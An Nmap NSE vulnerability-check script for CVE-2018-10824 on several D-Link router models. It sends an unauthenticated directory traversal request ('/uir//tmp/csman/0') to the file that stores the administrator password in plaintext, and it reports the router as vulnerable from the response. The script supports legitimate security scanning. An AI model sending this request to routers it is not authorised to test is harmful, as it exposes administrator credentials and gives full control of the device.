local http = require 'http'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local vulns = require 'vulns'

description = [[
Plaintext password file exposure on D-Link routers:

- DWR-116 through 1.06,
- DIR-140L through 1.02,
- DIR-640L through 1.02,
- DWR-512 through 2.02,
- DWR-712 through 2.02,
- DWR-912 through 2.02,
- DWR-921 through 2.02,
- DWR-111 through 1.01,
- and probably others with the same type of firmware.

The administrative password is stored in plaintext in the /tmp/csman/0 file.
An attacker using a directory traversal (or LFI) can easily get full router access.

The exploitation returns a binary config file which contains the administrator
username and password as well as many other router settings. By using the directory
traversal vulnerability, it is possible to read the file without authentication.

The script attempts a GET HTTP request to the targets.

References:
* https://seclists.org/fulldisclosure/2018/Oct/36
* https://sploit.tech/2018/10/12/D-Link.html
]]

---
-- @usage nmap --script http-vuln-cve2018-10824 -p 80,8080 <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2018-10824:
-- |   VULNERABLE:
-- |   D-Link routers plaintext password file exposure
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2018-10824
-- |       Plaintext password file exposure on D-Link routers.
-- |
-- |     Disclosure date: 2018-10-12
-- |     References:
-- |       https://seclists.org/fulldisclosure/2018/Oct/36
-- |_      https://sploit.tech/2018/10/12/D-Link.html
--
-- @xmloutput
-- <table key='2018-10824'>
-- <elem key='title'>D-Link routers plaintext password file exposure</elem>
-- <elem key='state'>VULNERABLE</elem>
-- <table key='ids'>
-- <elem>CVE:CVE-2018-10824</elem>
-- </table>
-- <table key='description'>
-- <elem>Plaintext password file exposure on D-Link routers.</elem>
-- </table>
-- <table key='dates'>
-- <table key='disclosure'>
-- <elem key='day'>12</elem>
-- <elem key='month'>10</elem>
-- <elem key='year'>2018</elem>
-- </table>
-- </table>
-- <elem key='disclosure'>2018-10-12</elem>
-- <table key='check_results'>
-- </table>
-- <table key='refs'>
-- <elem>https://seclists.org/fulldisclosure/2018/Oct/36</elem>
-- <elem>https://sploit.tech/2018/10/12/D-Link.html</elem>
-- </table>
-- </table>
--
---

author = 'Kostas Milonas'
license = 'Same as Nmap--See https://nmap.org/book/man-legal.html'
categories = {'vuln', 'safe'}

portrule = shortport.http

action = function(host, port)
  local vuln_table = {
    title = 'D-Link routers plaintext password file exposure',
    IDS = {CVE = 'CVE-2018-10824'},
    description = [[
Plaintext password file exposure on D-Link routers.
]],
    references = {
      'https://seclists.org/fulldisclosure/2018/Oct/36',
      'https://sploit.tech/2018/10/12/D-Link.html'
    },
    dates = {
      disclosure = {year = '2018', month = '10', day = '12'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN

  local uri = '/uir//tmp/csman/0'
  stdnse.debug1('Testing URI: %s', uri)

  local response = http.get(host, port, uri, { redirect_ok = false, no_cache = true })

  if response.status == 200 and response.header['content-type'] == 'application/x-none' then
    stdnse.debug1('Vulnerability found!')
    vuln_table.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln_table)
end
